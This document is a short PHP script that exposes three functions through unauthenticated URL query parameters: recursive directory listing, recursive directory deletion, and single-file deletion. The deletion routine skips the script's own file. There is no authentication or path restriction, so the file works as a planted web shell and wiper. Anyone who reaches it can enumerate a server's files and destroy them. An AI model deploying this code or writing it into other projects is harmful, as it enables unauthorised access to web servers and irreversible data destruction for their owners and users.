<?php
/**
 * Date: 12/6/2017
 * Time: 2:13 PM
 */


$config = array(
	'deletedir' => 'delDir',
	'listdir'   => 'listDir',
    'killfile'=>'delfile',
);
define( 'LOCATE_FILE', basename( __FILE__ ) );

?>
    <pre><?php
print_r( $config );


?></pre><?php

foreach ( $config as $key => $value ) {
	if ( isset( $_GET[ $key ] ) ) {
		if ( ! empty( $_GET[ $key ] ) ) {
			$value( $_GET[ $key ] );
		} else {
			$value();
		}
	}
}

function listDir( $dir = '.' ) {
	if ( ! empty( $dir ) && is_dir( $dir ) ) {
		$files = array_diff( scandir( $dir ), array( '.', '..' ) );
		foreach ( $files as $file ) {
			if ( is_dir( "$dir/$file" ) ) {
				print_r( '<br>Folder: ' . $dir . '/' . $file . '<br>' );
				listDir( "$dir/$file" );
			} else {
				print_r( '&ensp;&ensp;File: ' . $dir . '/' . $file . '<br>' );
			}
		}
	} else {
		echo 'no dir';
	}
}

function delDir( $dir = '.' ) {
	if ( ! empty( $dir ) && is_dir( $dir ) ) {
		$files = array_diff( scandir( $dir ), array( '.', '..' ) );
		foreach ( $files as $file ) {
			if ( is_dir( "$dir/$file" ) ) {
				delDir( "$dir/$file" );
			} else {
				if ( $file != LOCATE_FILE ) {
					delfile( "$dir/$file" );
				}
			}
		}

		delfolder( $dir );
	} else {
		echo 'no dir';
	}
}

function delfolder( $folder ) {
	if ( rmdir( $folder ) ) {
		echo 'Deleted folder: ' . $folder;
	} else {
		echo 'no folder';
	}

}

function delfile( $file ) {

	if ( unlink( $file ) ) {
		echo 'Deleted file: ' . $file;
	} else {
		echo 'no file';
	}

}